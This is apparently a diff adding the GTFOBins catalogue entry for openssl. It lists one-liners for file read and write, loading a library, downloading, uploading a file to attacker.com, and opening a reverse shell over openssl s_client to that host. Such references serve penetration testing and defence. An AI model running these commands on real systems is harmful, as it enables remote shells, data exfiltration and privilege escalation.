@@ -1,0 +1,58 @@
+<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/openssl -->
+---
+functions:
+  download:
+  - code: |-
+      openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    sender: tls-server
+  file-read:
+  - code: |-
+      openssl enc -in /path/to/input-file
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  file-write:
+  - code: |-
+      echo DATA | openssl enc -out /path/to/output-file
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  - code: |-
+      openssl enc -in /path/to/input-file -out /path/to/output-file
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  library-load:
+  - code: |-
+      openssl req -engine ./lib.so
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  reverse-shell:
+  - code: |-
+      mkfifo /path/to/temp-socket
+      /bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket
+    comment: |-
+      The shell process is not spawn by `openssl`.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    listener: tls-server
+  upload:
+  - code: |-
+      openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    receiver: tls-server
+...
